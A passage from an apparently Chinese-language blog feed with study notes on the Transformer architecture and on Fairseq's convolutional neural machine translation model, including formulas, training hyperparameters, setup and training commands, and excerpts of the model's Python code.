d_k}\)</span></li><li>这里如果维度<span class="math inline">\(d_k\)</span>很大的时候，两个向量的乘积会变得很大，使得softmax会得到非常小的数值，所以会在这里除以<span class="math inline">\(\sqrt{d_k}\)</span>来抵消这个影响。 <img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/attention.png" srcset="/img/loading.gif" lazyload></li></ul><h3><span id="14-multi-head-attention">1.4 Multi-Head Attention</span></h3><ul><li><p>这里假设<span class="math inline">\(Q,~K,~V\in\mathbb{R}^{d_\text{model}}\)</span>都在一个<span class="math inline">\({d_\text{model}}\)</span>维度的空间中</p></li><li><p>使用h个不一样权重的线性映射函数<span class="math inline">\((QW^Q_i, KW^K_i, VW^V_i)\)</span>将Q, K,V分别映射到<span class="math inline">\(d_k,~d_k,~d_v\)</span>空间中</p></li><li><p>对映射之后的Q, K, V 做h次attention，并将h个attentionhead连接在一起形成一个新的向量</p></li><li><p>最后再将这个向量映射到<span class="math inline">\(d_\text{model}\)</span>空间，作为下一层的输入</p><p>​ <span class="math display">\[ \text{MultiHead}(Q,K,V) =\text{Concat}(\text{head}_1,\cdots, \text{head}_h) W^O \\ \text{head}_i= \text{Attention}(QW^Q_i, KW^K_i, VW^V_i) \]</span></p></li><li><p>其中<span class="math inline">\(W^Q_i\in\mathbb{R}^{d_\text{model}\times d_k}, W^K_i\in\mathbb{R}^{d_\text{model}\times d_k}, W^V_i\in\mathbb{R}^{d_\text{model}\times d_v}, W^O\in \mathbb{R}^{hd_v\timesd_\text{model}}\)</span>, 常见的设置<span class="math inline">\(h=8,d_k=d_v=d_\text{model}/h=64\)</span></p></li><li><p>模型图 <img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/mha.png" srcset="/img/loading.gif" lazyload></p></li><li><p>应用</p><ul><li>将decoder上一个时刻的hidden state作为query，将encoder的<mark>最顶层</mark>的所有输出的hiddenstate作为key和value，这样可以类似传统的attention机制一样去发现源语言单词与目标语言单词之间的联系</li><li>encoder本身会对源语言单词进行multi-head selfattention，其中query，key，value都是一样的，都是上一层中输出的单词的hiddenstate，<strong>每一个时刻计算出来的contextvector都会作为该层输出的新的单词的hiddenstate，并作为下一层的输入</strong>。</li><li><mark>decoder本身也会类似encoder一样去做selfattention，不同的是，decoder只对左边已经生成的序列进行attention，对还没有生成的（右边的）序列掩盖（masking）</mark></li></ul></li><li><p>完整的模型图 <img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/transformer.png" srcset="/img/loading.gif" lazyload></p></li></ul><h3><span id="15基于位置的前向神经网络position-wise-feed-forward-networks">1.5基于位置的前向神经网络（Position-wise Feed-Forward Networks）</span></h3><ul><li>对于encoder和decoder的每个attention层之后，<mark>还会在连接一个全连接的前向神经网络</mark>。这个网络包含了<mark>两个线性转换</mark>和中间加一个ReLU的激活函数<span class="math display">\[FFN(x) =\max(0, xW_1+b_1)W_2+b_2\]</span></li><li>这里每一层，都用不同的<span class="math inline">\(W_1,W_2,b_1,b_2\)</span>。</li></ul><h3><span id="16-词向量矩阵及softmax层">1.6 词向量矩阵及Softmax层</span></h3><ul><li>这里使用常见的词向量矩阵，并encoder会把词向量映射到<span class="math inline">\(d_\text{model}\)</span>空间上，作为第一层的输入</li><li>在做预测的时候，会将输出向量映射到一个词表大小的概率空间中，并使用softmax来归一化到一个<span class="math inline">\([0,1]\)</span>之间的概率值。</li></ul><h3><span id="17-位置编码positionembeddings">1.7 位置编码（positionembeddings）</span></h3><ul><li><p>因为模型没有recurrence及convolution的操作，所以为了<mark>让模型能够分辨不同位置的单词</mark>，需要对单词的位置进行编码。</p><p>​ <span class="math display">\[PE(pos,2i)=\sin(pos/10000^{2i/d_\text{model}}) \\ PE(pos,2i+1)=\cos(pos/10000^{2i/d_\text{model}})\]</span></p></li><li><p><mark>pos是这个单词在句子中的位置</mark>，<mark>i是这个位置向量的第i个维度的编号</mark>。这样的波长形成了一个从<span class="math inline">\(2\pi\)</span>到<span class="math inline">\(1000\cdot2\pi\)</span>的几何级数。这样会使得模型更容易学到相对距离，因为<span class="math inline">\(PE_{pos+k}\)</span>可以表示为<span class="math inline">\(PE_{pos}\)</span>的一个线性变化。</p></li></ul><h3><span id="18-transformer-对比rnn及cnn">1.8 Transformer 对比RNN及CNN</span></h3><ul><li>发现RNN需要进行<span class="math inline">\(O(n)\)</span>个序列操作，而Transformer和CNN只需要<span class="math inline">\(O(1)\)</span>个</li><li>CNN会形成一个层级结构，类似树状，<mark>所以任意两个单词到达的最大路径长度是</mark><span class="math inline">\(O(\log_k(n))\)</span></li><li>如果self-attention只对该单词周围r个单词进行attention操作，可以得到restricted版本的self-attention，这样可以减少每一层的计算复杂度，但未增加两个任意词之间到达的最长路径。<img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/compare.png" srcset="/img/loading.gif" lazyload></li></ul><h2><span id="2-transformer模型的训练细节">2. Transformer模型的训练细节</span></h2><ol type="1"><li>优化方法</li><li>正则化 （regularization）</li><li>label smoothing</li></ol><h3><span id="21-优化方法">2.1 优化方法</span></h3><ul><li>Adam 优化方法，<span class="math inline">\(\beta_1=0.9,\beta_2=0.98, \epsilon=10^{-9}\)</span></li><li>learningrate是随着训练的过程中，通过以下一个函数进行变化。一开始在前warmup_steps个训练迭代中learningrate是线性增长的，往后随着步长的增加而下降。 一般会设置 warmup_steps =4000 <span class="math display">\[lr = d_\text{model}^{-0.5} \cdot\min(\text{step_num}^{-0.5},\text{step_num}\cdot\text{warmup_steps}^{-1.5}) \]</span></li></ul><h3><span id="22-正则化-regularization">2.2 正则化 Regularization</span></h3><ul><li>对每一个子层的输出，在<mark>该子层的输出加上该子层的输入之前进行</mark>dropout</li><li>对encoder及decoder，<mark>词向量和位置向量求和之后</mark>都进行dropout</li></ul><h3><span id="23-label-smoothing">2.3 Label Smoothing</span></h3><ul><li>对于<mark>正确的标注label</mark>，在其one-hot表达上，<mark>加上一个均匀分布的向量</mark>，这个smoothing的数值是<span class="math inline">\(\epsilon_{ls}=0.1\)</span></li></ul><h2><span id="3-tranformer-code">3 Tranformer Code</span></h2><p><a href="https://github.com/RacleRay/DeepLearningFoundation/blob/master/2.0-Transformer.ipynb">TensorFlowtransformer</a></p><ul><li><a href="https://github.com/tensorflow/models/tree/master/official/transformer">官方代码</a></li><li><a href="https://github.com/tensorflow/tensor2tensor/blob/master/tensor2tensor/models/transformer.py">作者代码</a></li><li><a href="https://github.com/OpenNMT/OpenNMT-py/tree/master/onmt">哈佛NLP组pytorch实现</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> NLP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> transformer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fairseq Notes</title>
      <link href="/posts/62a02478.html"/>
      <url>/posts/62a02478.html</url>
      
        <content type="html"><![CDATA[<h2><span id="1基于cnn的翻译系统模型结构">1.基于CNN的翻译系统模型结构</span></h2><p>​在自然语言处理中，大部分流行的seq2seq模型都是基于RNN结构去构建encoder和decoder，但是RNN对于下一个状态的预测需要依赖前面的所有历史状态，<mark>使得并行化操作难以充分进行</mark>，难以发挥完全发挥GPU并行的效率。相反<mark>CNN通过在固定窗口内的计算</mark>，使得计算的并行化变得更加简单，而且通过多层CNN网络可以构建<mark>层级结构(hierarchicalstructure)</mark>，可以达到利用更短的路径去覆盖更长范围内的信息。</p><p>​ Facebook提出了基于CNN的机器翻译模型，并开源了CNN的机器翻译工具<a href="https://github.com/facebookresearch/fairseq">Fairseq</a></p><h3><span id="11-pooling-encoder">1.1 Pooling Encoder</span></h3><p>​ 最简单的non-recurrent encoder就是把k个连续的单词的<span class="burk">词向量求平均值</span>，通过在句子左右两边都添加额外的空单词(<mark>paddings</mark>)，可以使得encoder输出跟原来句子同等长度的hiddenembeddings。</p><blockquote><ul><li>假设原来的句子的词向量（word embedding）表示为 <span class="math inline">\(w=[w_1,\cdots,w_m],~\forall~w_j\inR^f\)</span></li><li>absolute position embeddings用于编码<mark>位置信息</mark>　<span class="math inline">\(p=[p_1,\cdots,p_m],~\forall~p_j\in R^f\)</span><span class="math display">\[e_j = w_j + p_j,~~ z_j = {1\over k}\sum_{t=-k/2}^{k/2}e_{j+t} \]</span></li><li>传统的attention机制 <span class="math display">\[ c_i = \sum_{j=1}^ma_{ij} e_j\]</span></li></ul></blockquote><h3><span id="12卷积编码器convolutional-encoder-nmt-gehring-et-al-2016">1.2卷积编码器Convolutional Encoder NMT </span></h3><ul><li>​ 卷积编码器在pooling encoder的基础上进行改进，使用一个CNN-a卷积层来进一步编码源语言句子中的词。输出原句长度的第一层卷积结果Z。</li></ul><p>​ <span class="math display">\[z_j = CNN\_a(e)_j \]</span></p><ul><li>​注意attention的时候，使用了另一个CNN-c卷积层来编码源语言句子中的单词，还是输出原句长度的第一层卷积结果，作为计算atttentionweight的encoder hidden states。然后计算atttentionweight，再进行加权求和。</li></ul><p>​ <span class="math display">\[c_i = \sum_{j=1}^m a_{ij}CNN\_c(e)_j\]</span></p><p>​ 该模型的encoder 采用的是CNN，但其decoder还是采用了传统的RNN模型</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/cnn-encoder.png" srcset="/img/loading.gif" lazyload></p><h3><span id="13全卷积神经翻译模型-convolutional-nmt-gehring-et-al-2017">1.３全卷积神经翻译模型　Convolutional NMT </span></h3><ul><li><p>该模型的encoder和decoder都采用的是卷积核CNN，动图演示 <img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/fairseq.gif" srcset="/img/loading.gif" lazyload></p></li><li><p>卷积核结构</p><ul><li><p>假设有1D的卷积核的窗口大小是k(比如k=5)，每个卷积核都可以用一个权重矩阵<span class="math inline">\(W\in \mathbb{R}^{2d\times kd}\)</span>和 bias<span class="math inline">\(b_w\in\mathbb{R}^{2d}\)</span>。对于窗口内的词向量　<span class="math inline">\(X\in \mathbb{R}^{k\timesd}\)</span>把所有单词拼接成一个长向量　<span class="math inline">\(X&#39;\in \mathbb{R}^{kd}\)</span>. <span class="math display">\[Y=WX&#39;+b_w = [A B] \in \mathbb{R}^{2d} \\A,B\in \mathbb{R}^{d} \]</span></p></li><li><p>接下来采用<strong>Gated LinearUnites(GLU)</strong>的方式来进行编码, <span class="math inline">\(\sigma()\)</span>是一个非线性的激活函数，　<span class="math inline">\(\otimes\)</span>是element-wise mulitiplication<span class="math display">\[v([A B] = A \otimes \sigma(B) \in\mathbb{R}^d\]</span></p></li><li><p>残差连接　ResidualConnection:　把这一层的输入也累加到下一层的输出 <span class="math display">\[h_i^l = v(W^l[h_{(i-k)/2}^{l-1},\cdots,h_{(i+k)/2}^{l-1}]+b_w^l)+h_i^{l-1}　\in\mathbb{R}^d\]</span></p></li></ul></li><li><p>编码器　Encoder:</p><ul><li><p>假设原来的句子的词向量（word embedding）表示为 <span class="math inline">\(w=[w_1,\cdots,w_m],~\forall~w_j\in\mathbb{R}^f\)</span></p></li><li><p>absolute position embeddings用于编码位置信息　<span class="math inline">\(p=[p_1,\cdots,p_m],~\forall~p_j\in\mathbb{R}^f\)</span> <span class="math display">\[e_j = w_j + p_j \\\]</span></p></li><li><p>encoder 先用一个线性函数<span class="math inline">\(f:\mathbb{R}^f\rightarrow\mathbb{R}^d\)</span>，把词向量映射到d维空间中<br></p></li><li><p>接下来encoder会将词向量通过一层层卷积核，得到每一层的单词的隐式表达（hiddenstate）, 其中　<span class="math inline">\(z_j^u\)</span>　代表的是第u层CNN中第j个单词的表达</p></li></ul></li><li><p>Multi-step Attention机制</p><ul><li><p>假设已经翻译的单词的词表达是 <span class="math inline">\(g=[g_1,\cdots,g_n]\)</span>，跟源语言的词表达一样，这里也是wordembeddings加上positional embeddings</p></li><li><p>假设decoder的卷积核的hidden state <span class="math inline">\(h_i^l\)</span>,可以进一步计算decoder已经生成的单词的每一层的单词表达 <span class="math display">\[d_i^l = W_d^l h_i^l + b_d^l + g_i\]</span></p></li><li><p>假设encoder 最顶层(假设是第u层)中，每个单词的表达是<span class="math inline">\(z_j^u\)</span>。可以计算decoder第l层中第i个已经生成的单词<span class="math inline">\(h_i^l\)</span>与源语言句子中最顶层（也即是第u层）的第j个单词<span class="math inline">\(z_j^u\)</span>的权重:<br><span class="math display">\[a_{ij}^l = {\exp(d_i^l \cdot z_j^u) \over\sum_{t=1}^m \exp(d_i^l \cdot z_t^u) } \]</span></p></li><li><p>可以进一步计算在decoder第l层，在第i个时刻的上下文向量（也即是contextvector）如以下公式，其中将encoder最顶层(第u层)的词向量<span class="math inline">\(z_j^u\)</span>与最底层的词向量<span class="math inline">\(e_j\)</span>相加。</p></li></ul><p>​ <span class="math display">\[c_i^l = \sum_{j=1}^m a_{ij}^l (z_j^u +e_j) \]</span></p><ul><li>将<span class="math inline">\(c_i^l\)</span>加到<span class="math inline">\(h_i^l\)</span>中，作为decoder 的下一层的输入</li></ul></li><li><p>解码器　decoder</p><ul><li>把decoder最顶层的hidden state <span class="math inline">\(h_i^L\)</span>　通过一个线性的函数映射到词表空间上<span class="math inline">\(d\rightarrow|V|\)</span>，之后在通过一个softmax函数　归一化成一个条件概率向量：<span class="math display">\[p(y_{i+1}|y_1,\cdots, y_i, x)= softmax(W_oh_i^L + b_0) \in \mathbb{R}^{|V|} \]</span></li></ul></li><li><p>模型的结构图</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/cnn-nmt.png" srcset="/img/loading.gif" lazyload alt="Drawing" style="width: 500px;"></p><h3><span id="14全卷积神经翻译模型对比rnn神经翻译模型">1.4全卷积神经翻译模型对比RNN神经翻译模型</span></h3><ol type="1"><li>全卷积神经网络使用层级结构，可以充分地并行化</li><li>对于一个窗口大小为<span class="math inline">\(k\)</span>的CNN，编码一个特征向量可以总结一个窗口为n个单词的信息，只需要做<span class="math inline">\(O(n/k)\)</span>个卷积核操作。对比RNN，RNN编码一个窗口为n个单词的信息，需要做<span class="math inline">\(O(n)\)</span>个操作，跟句子的长度成正比</li><li>对于一个CNN的输入，都进行了相同数量的卷积操作及非线性操作。对比RNN，第一个输入的单词进行了n词非线性操作，而最后一个输入的单词只进行了一次非线性操作。<mark>对于每个输入都进行相同数量的操作会有利于训练</mark>。</li><li>训练CNNNMT<strong>需要非常小心地设置参数及调整网络中某些层的缩放</strong>。</li></ol><h2><span id="2使用cnn完成神经机器翻译系统的tricks">2使用CNN完成神经机器翻译系统的tricks</span></h2><p>​训练过程中，需要将网络中某些部分进行缩放(scaling)，需要对权重初始化，需要对超参数进行设置</p><h3><span id="21-缩放操作scaling">2.1 缩放操作（scaling）</span></h3><ul><li>将残差层的输出乘以　<span class="math inline">\(\sqrt{0.5}\)</span>，　这样会减小一半的偏差variance</li><li>对于attention机制产生的上下文向量　<span class="math inline">\(c_{ij}^l\)</span>　乘以一个系数　<span class="math inline">\(m\sqrt{1/m}\)</span>,其中m为源语言句子中单词个个数，这样做的好处也是能减小偏差。</li><li>对于CNN decoder有multiple atttention的情况，将encoder每一层的gradient乘以一个系数，该系数是<mark>使用的attention的数量</mark>。注意，只对encoder中除了源语言单词的词向量矩阵以外的参数，放大gradient，源语言的词向量矩阵的gradient不进行放大。在实验中，这样的操作会使得训练能更加稳定。</li></ul><h3><span id="22-参数初始化">2.2 参数初始化</span></h3><ul><li>所有的词向量矩阵从一个以０为中心，标准差为0.1的高斯分布中随机初始化　<span class="math inline">\(\mathcal{N}(0, \sqrt{n_l})\)</span>, 其中<span class="math inline">\(n_l\)</span>为输入到这个神经元的输入个数，一般可以设置为0.1。这样能有助于保持一个正态分布的偏差。</li><li>还需要对每一层的激活函数输出进行正规化(normalization)，　比如残差连接中，每一层层的输出向量需要先做正则化，再把这一层的输入加到输出的向量上。</li><li>对于GLU，需要对其权重　<span class="math inline">\(W\)</span>从一个正态分布<span class="math inline">\(\mathcal{N}(0, \sqrt{4p\overn_l})\)</span>中随机抽样，而其bias设置成０</li><li>对每一层网络的输入向量都进行dropout处理</li></ul><h3><span id="23-超参数设置">2.3 超参数设置</span></h3><ul><li>encoder 和decoder都是用512维的hidden units，512维的wordembeddings</li><li>训练的时候使用Nesterov's accelerated gradient的方法进行优化模型，momentum 设置成0.99</li><li>如果gradient的norm超过0.1就把gradient 重新归一化到0.1以内。</li><li>初始的learningrate设置成0.25，如果在每次进行valudation的时候dev数据集中的perplexity没有下降，就将learningrate乘以0.1,　一直持续到learning rate 降到<span class="math inline">\(10^{-4}\)</span>以下停止训练</li><li>mini-batch的大小设置成每次处理64句双语句子</li></ul><h2><span id="3-facebook-cnn机器翻译系统代码解析">3. Facebook CNN机器翻译系统代码解析</span></h2><ul><li>相应的代码可以在github上找到　<a href="https://github.com/pytorch/fairseq">fairseq</a></li><li>安装</li></ul><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/pytorch/fairseq.git<br><span class="hljs-built_in">cd</span> fairseq<br>pip install -r requirements.txt<br>python setup.py build develop<br></code></pre></div></td></tr></table></figure><p>https://fairseq.readthedocs.io/en/latest/command_line_tools.html</p><h3><span id="31-code">3.1 Code</span></h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 预处理数据</span><br>$ bash prepare-wmt14en2de.sh --icml17<br><br>$ <span class="hljs-built_in">cd</span> examples/translation/<br>$ bash prepare-wmt14en2de.sh<br>$ <span class="hljs-built_in">cd</span> ../..<br><br><span class="hljs-comment"># 将数据处理成二进制形式，加速读写</span><br>$ TEXT=examples/translation/wmt14_en_de<br>$ python preprocess.py --<span class="hljs-built_in">source</span>-lang en --target-lang de \<br>  --trainpref <span class="hljs-variable">$TEXT</span>/train --validpref <span class="hljs-variable">$TEXT</span>/valid --testpref <span class="hljs-variable">$TEXT</span>/<span class="hljs-built_in">test</span> \<br>  --destdir data-bin/wmt14_en_de --thresholdtgt 0 --thresholdsrc 0<br><br><span class="hljs-comment"># 训练模型</span><br><span class="hljs-comment"># 如果显存不足，可以将--max-tokens设置成1500</span><br>$ mkdir -p checkpoints/fconv_wmt_en_de<br>$ python train.py data-bin/wmt14_en_de \<br>  --lr 0.5 --clip-norm 0.1 --dropout 0.2 --max-tokens 4000 \<br>  --criterion label_smoothed_cross_entropy --label-smoothing 0.1 \<br>  --lr-scheduler fixed --force-anneal 50 \<br>  --arch fconv_wmt_en_de --save-dir checkpoints/fconv_wmt_en_de<br><br><span class="hljs-comment"># 测试，生成</span><br>$ python generate.py data-bin/wmt14_en_de \<br>  --path checkpoints/fconv_wmt_en_de/checkpoint_best.pt --beam 5 --remove-bpe<br></code></pre></div></td></tr></table></figure><h3><span id="32-使用预训练好的模型">3.2 使用预训练好的模型</span></h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 下载模型及测试数据</span><br>$ mkdir -p data-bin<br>$ curl https://dl.fbaipublicfiles.com/fairseq/models/wmt14.v2.en-fr.fconv-py.tar.bz2 | tar xvjf - -C data-bin<br>$ curl https://dl.fbaipublicfiles.com/fairseq/data/wmt14.v2.en-fr.newstest2014.tar.bz2 | tar xvjf - -C data-bin<br><br><span class="hljs-comment"># 进行翻译生成</span><br>$ python generate.py data-bin/wmt14.en-fr.newstest2014  \<br>  --path data-bin/wmt14.en-fr.fconv-py/model.pt \<br>  --beam 5 --batch-size 128 --remove-bpe | tee /tmp/gen.out<br><br><br><span class="hljs-comment"># 对翻译结果打分</span><br>$ grep ^H /tmp/gen.out | cut -f3- &gt; /tmp/gen.out.sys<br>$ grep ^T /tmp/gen.out | cut -f2- &gt; /tmp/gen.out.ref<br>$ python score.py --sys /tmp/gen.out.sys --ref /tmp/gen.out.ref<br></code></pre></div></td></tr></table></figure><h3><span id="33-notes">3.3 Notes</span></h3><ul><li>CNN NMT类 FConvModel</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">@register_model('fconv')</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FConvModel</span><span class="hljs-params">(FairseqModel)</span>:</span><br>    <span class="hljs-string">"""</span><br><span class="hljs-string">    Args:</span><br><span class="hljs-string">        encoder (FConvEncoder): the encoder</span><br><span class="hljs-string">        decoder (FConvDecoder): the decoder</span><br><span class="hljs-string">    """</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, encoder, decoder)</span>:</span><br>        ...<br><span class="hljs-meta">    @staticmethod</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_args</span><span class="hljs-params">(parser)</span>:</span><br>        parser.add_argument(<span class="hljs-string">'--dropout'</span>, type=float, metavar=<span class="hljs-string">'D'</span>,<br>                            help=<span class="hljs-string">'dropout probability'</span>)<br>        parser.add_argument(<span class="hljs-string">'--encoder-embed-dim'</span>, type=int, metavar=<span class="hljs-string">'N'</span>,<br>                            help=<span class="hljs-string">'encoder embedding dimension'</span>)<br>        parser.add_argument(<span class="hljs-string">'--encoder-embed-path'</span>, type=str, metavar=<span class="hljs-string">'STR'</span>,<br>                            help=<span class="hljs-string">'path to pre-trained encoder embedding'</span>)<br>        parser.add_argument(<span class="hljs-string">'--encoder-layers'</span>, type=str, metavar=<span class="hljs-string">'EXPR'</span>,<br>                            help=<span class="hljs-string">'encoder layers [(dim, kernel_size), ...]'</span>)<br>        parser.add_argument(<span class="hljs-string">'--decoder-embed-dim'</span>, type=int, metavar=<span class="hljs-string">'N'</span>,<br>                            help=<span class="hljs-string">'decoder embedding dimension'</span>)<br>        parser.add_argument(<span class="hljs-string">'--decoder-embed-path'</span>, type=str, metavar=<span class="hljs-string">'STR'</span>,<br>                            help=<span class="hljs-string">'path to pre-trained decoder embedding'</span>)<br>        parser.add_argument(<span class="hljs-string">'--decoder-layers'</span>, type=str, metavar=<span class="hljs-string">'EXPR'</span>,<br>                            help=<span class="hljs-string">'decoder layers [(dim, kernel_size), ...]'</span>)<br>        parser.add_argument(<span class="hljs-string">'--decoder-out-embed-dim'</span>, type=int, metavar=<span class="hljs-string">'N'</span>,<br>                            help=<span class="hljs-string">'decoder output embedding dimension'</span>)<br><span class="hljs-meta">    @classmethod</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_model</span><span class="hljs-params">(cls, args, task)</span>:</span><br>        base_architecture(args)<br>        ...<br>        encoder = FConvEncoder(<br>            dictionary=task.source_dictionary,<br>            embed_dim=args.encoder_embed_dim,<br>            embed_dict=encoder_embed_dict,<br>            convolutions=eval(args.encoder_layers),<br>            dropout=args.dropout,<br>            max_positions=args.max_source_positions,<br>        )<br>        decoder = FConvDecoder(<br>            dictionary=task.target_dictionary,<br>            embed_dim=args.decoder_embed_dim,<br>            embed_dict=decoder_embed_dict,<br>            convolutions=eval(args.decoder_layers),<br>            out_embed_dim=args.decoder_out_embed_dim,<br>            attention=eval(args.decoder_attention),<br>            dropout=args.dropout,<br>            max_positions=args.max_target_positions,<br>            share_embed=args.share_input_output_embed,<br>        )<br>        <span class="hljs-keyword">return</span> FConvModel(encoder, decoder)<br></code></pre></div></td></tr></table></figure><ul><li>CNN encoder类</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FConvEncoder</span><span class="hljs-params">(FairseqEncoder)</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">            self, dictionary, embed_dim=<span class="hljs-number">512</span>, embed_dict=None, max_positions=<span class="hljs-number">1024</span>,</span></span><br><span class="hljs-function"><span class="hljs-params">            convolutions=<span class="hljs-params">(<span class="hljs-params">(<span class="hljs-number">512</span>, <span class="hljs-number">3</span>)</span>,)</span> * <span class="hljs-number">20</span>, dropout=<span class="hljs-number">0.1</span>, left_pad=True,</span></span><br><span class="hljs-function"><span class="hljs-params">    )</span>:</span><br>        ...<br>        <span class="hljs-comment"># 定义词向量矩阵及位置矩阵</span><br>        self.embed_tokens = Embedding(num_embeddings, embed_dim, self.padding_idx)<br>        self.embed_positions = PositionalEmbedding(<br>            max_positions,<br>            embed_dim,<br>            self.padding_idx,<br>            left_pad=self.left_pad,<br>        )<br><br>        convolutions = extend_conv_spec(convolutions)<br>        in_channels = convolutions[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]<br>        self.fc1 = Linear(embed_dim, in_channels, dropout=dropout)<br>        self.projections = nn.ModuleList()<br>        self.convolutions = nn.ModuleList()<br>        self.residuals = []<br>        <br>        <span class="hljs-comment"># 定义CNN层及残差层</span><br>        layer_in_channels = [in_channels]<br>        <span 